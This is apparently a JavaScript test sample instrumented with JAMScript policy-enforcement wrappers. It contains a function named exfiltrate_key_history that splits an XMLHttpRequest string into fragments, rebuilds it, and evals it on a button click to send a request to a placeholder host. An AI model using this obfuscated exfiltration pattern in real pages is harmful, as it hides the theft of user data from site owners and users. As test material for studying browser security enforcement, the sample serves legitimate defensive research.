function exfiltrate_key_history() {
  var a = "xmlhttp=new XMLHt";
  var b = "tpRequest();";
  var c = "xmlhttp.op";
  var d = 'en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);';
  var e$$4 = "xmlhttp.se";
  var f = "nd(null);";
  var v5 = a + b;
  var v4 = v5 + c;
  var v3 = v4 + d;
  var v2 = v3 + e$$4;
  var v0 = v2 + f;
  if(JAMScript.isEval(eval)) {
    eval("introspect(JAMScript.introspectors.processAll) { " + v0 + " }")
  }else {
    JAMScript.call(eval, null, [v0])
  }
  return
}
introspect(JAMScript.introspectors.processD1B26E82C3C7C4AA5A6D93F7A0110D043B1A982F6FDE2E7025F368C3AE67F96C507DCB6901C6433F9CB8A41433C08E91270D0B4B596856AC65D440B81C0DACAB8A030DE26DF30A320CF2FEB0065B4F71) {
  var v1 = document.getElementById("test")
}
JAMScript.set(v1, "onclick", exfiltrate_key_history, JAMScript.introspectors.processAF65661CDDA02BEF577B9796994F429B325DEECD);

